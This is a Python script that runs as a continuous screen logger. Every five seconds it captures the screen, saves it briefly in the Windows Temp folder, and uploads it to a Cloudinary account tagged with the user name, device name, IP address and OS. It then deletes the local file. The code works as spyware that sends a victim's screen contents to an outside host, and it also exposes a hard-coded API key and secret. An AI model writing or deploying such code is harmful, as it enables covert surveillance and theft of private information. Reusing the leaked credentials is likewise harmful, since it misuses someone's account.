import pyautogui

from PIL import Image

from cloudinary import config
from cloudinary.uploader import upload
from datetime import datetime
from os import path, getlogin, makedirs, remove
from platform import node, system
from socket import gethostbyname, gethostname
from time import sleep


config(
    cloud_name="dsnwguzkd",
    api_key="623166659259627",
    api_secret="hrxWwTWkKXg_tQYr-0NGlqsjWDE",
    secure=True,
)

INTERVAL = 5
USER_NAME = getlogin()
DEVICE_NAME = node()
try:
    IP_ADDRESS = gethostbyname(gethostname())
except:
    IP_ADDRESS = "Unkown"
OS_NAME = system()

SAVE_PATH = f"C:/Users/{USER_NAME}/AppData/local/Temp"
makedirs(SAVE_PATH, exist_ok=True)


def upload_to_cloudinary(filepath: str) -> None:
    file_name = filepath[len(SAVE_PATH) + 1 : -4]
    time_stamp = datetime.now().isoformat()
    upload(
        filepath,
        display_name=file_name,
        folder=f"screenshots/{USER_NAME}",
        tags=[USER_NAME, DEVICE_NAME],
        context={
            "user": USER_NAME,
            "device": DEVICE_NAME,
            "ip_address": IP_ADDRESS,
            "os_name": OS_NAME,
            "time_stamp": time_stamp,
        },
    )
    remove(filepath)


def take_screenshot():
    while True:
        filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg"
        filepath = path.join(SAVE_PATH, filename)

        screenshot = pyautogui.screenshot()
        screenshot = screenshot.convert("RGB")
        screenshot.save(filepath, "JPEG", quality=70, optimize=True)

        upload_to_cloudinary(filepath)
        print(f"Screenshot guardada: {filepath}")

        sleep(INTERVAL)


take_screenshot()
